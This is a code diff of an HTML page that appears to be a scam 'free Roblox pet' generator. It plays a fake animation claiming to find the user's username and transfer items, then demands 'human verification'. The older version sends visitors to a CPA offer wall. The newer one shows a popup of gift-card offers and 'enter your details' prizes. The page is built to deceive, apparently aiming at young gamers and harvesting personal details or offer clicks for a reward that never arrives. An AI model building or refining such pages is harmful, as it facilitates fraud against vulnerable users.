@@ -1,75 +1,38 @@
+html
+Copy
+Edit
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Generating...</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    body {
-      background: linear-gradient(to bottom, #a2e4f5, #c6f5d4);
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-    }
-    .loading-box {
-      background: white;
-      border-radius: 15px;
-      padding: 40px;
-      margin: 100px auto;
-      width: 90%;
-      max-width: 500px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    }
-    .loading-box img {
-      width: 160px;
-      margin-bottom: 15px;
-    }
-    .message {
-      font-size: 1.2em;
-      margin-bottom: 20px;
-    }
-    .dots {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      margin-top: 15px;
-    }
-    .dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background-color: #ccc;
-    }
-    .dot.active {
-      background-color: #00cc66;
-    }
-    .verify-btn {
-      display: none;
-      margin-top: 15px;
-      padding: 10px 20px;
-      background: #00cc66;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifying...</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
-<body>
+<body class="loading-screen">
   <div class="loading-box">
-    <img src="logo.png" alt="Logo" />
-    <div class="message" id="message">Connecting to servers...</div>
-    <div class="dots" id="dots">
-      <div class="dot" id="dot1"></div>
-      <div class="dot" id="dot2"></div>
-      <div class="dot" id="dot3"></div>
-      <div class="dot" id="dot4"></div>
-      <div class="dot" id="dot5"></div>
+    <img src="logo.png" alt="Logo" class="logo" />
+    <h3 id="statusText"></h3>
+    <div class="dots">
+      <span class="dot" id="dot1"></span>
+      <span class="dot" id="dot2"></span>
+      <span class="dot" id="dot3"></span>
+      <span class="dot" id="dot4"></span>
+      <span class="dot" id="dot5"></span>
     </div>
-    <button id="verifyBtn" class="verify-btn" onclick="showPopup()">Verify</button>
+    <div id="verifySection" style="display:none;">
+      <button class="verify-btn" onclick="showOffer()">Verify</button>
+    </div>
+  </div>
+
+  <div class="offer-popup" id="offerPopup" style="display:none;">
+    <img src="logo.png" alt="Logo" style="width: 80px; margin-bottom: 10px;" />
+    <h2>🎁 LAST STEP !</h2>
+    <p>Complete a simple task below and your pet will be sent to your account, don’t worry it's free!</p>
+    <button class="offer-button">Enter for a Chance to win a $50 gift card for Roblox!</button>
+    <button class="offer-button">Don't miss out! $500 on the line for Walmart, enter NOW!</button>
+    <button class="offer-button">Enter your details to win a prepaid Visa Card!</button>
+    <div class="loader"></div>
   </div>
 
   <script>
@@ -77,65 +40,64 @@
       "Connecting to servers...",
       "Successfully connected.",
       "Finding username...",
-      "<span style='color:green'>Username found!</span>",
-      "<span style='color:green'>Starting transfer...</span>",
+      "Username found!",
+      "Generating items...",
+      "Starting transfer...",
       "Verifying human activity...",
-      "<span style='color:red'>Human Verification Required.</span>"
     ];
 
-    const dots = [dot1, dot2, dot3, dot4, dot5];
-    const msgElem = document.getElementById("message");
-    const verifyBtn = document.getElementById("verifyBtn");
+    const colors = {
+      3: "green", // Username found
+      5: "green", // Starting transfer
+      6: "black"
+    };
 
-    let step = 0;
+    let index = 0;
 
-    function typeMessage(text, callback) {
-      msgElem.innerHTML = "";
-      let i = 0;
-      const plainText = text.replace(/<[^>]+>/g, "");
-      const interval = setInterval(() => {
-        msgElem.innerHTML = text.substring(0, i) + "|";
-        i++;
-        if (i > plainText.length) {
-          clearInterval(interval);
-          msgElem.innerHTML = text;
-          if (callback) callback();
-        }
-      }, 50);
-    }
-
-    function updateStep() {
-      if (step >= messages.length) return;
-      typeMessage(messages[step], () => {
-        if (step < dots.length) dots[step].classList.add("active");
-        if (step === 5) {
-          setTimeout(() => {
-            step++;
-            updateStep();
-          }, 4000);
-        } else {
-          step++;
-          updateStep();
-        }
-
-        if (step === 7) {
-          verifyBtn.style.display = "inline-block";
-        }
-      });
-    }
-
-    function showPopup() {
-      alert("Redirecting to offer wall...");
-      window.location.href = "https://www.cpagrip.com"; // Replace with real CPAGrip URL
-    }
-
-    updateStep();
-
-    window.addEventListener("pageshow", function (e) {
-      if (e.persisted) {
-        window.location.href = "index.html";
+    function typeWriter(text, i, callback, color) {
+      if (i < text.length) {
+        const status = document.getElementById("statusText");
+        status.innerHTML = text.substring(0, i + 1);
+        if (color) status.style.color = color;
+        setTimeout(() => typeWriter(text, i + 1, callback, color), 40);
+      } else {
+        if (callback) setTimeout(callback, text.includes("Verifying human activity") ? 4000 : 1000);
       }
-    });
+    }
+
+    function updateDot(dotIndex) {
+      const dot = document.getElementById(dot${dotIndex});
+      if (dot) dot.classList.add("active");
+    }
+
+    function startTypingSequence() {
+      if (index >= messages.length) {
+        document.getElementById("statusText").innerHTML = "Human Verification Required.";
+        document.getElementById("statusText").style.color = "red";
+        document.getElementById("verifySection").style.display = "block";
+        updateDot(5);
+        return;
+      }
+
+      const color = colors[index] || "black";
+      typeWriter(messages[index], 0, () => {
+        updateDot(index + 1);
+        index++;
+        startTypingSequence();
+      }, color);
+    }
+
+    function showOffer() {
+      document.getElementById("offerPopup").style.display = "block";
+    }
+
+    // Force redirect to index.html if username is missing (refresh case)
+    if (!sessionStorage.getItem("usernameEntered")) {
+      window.location.href = "index.html";
+    } else {
+      sessionStorage.removeItem("usernameEntered");
+      startTypingSequence();
+    }
   </script>
 </body>
 </html>
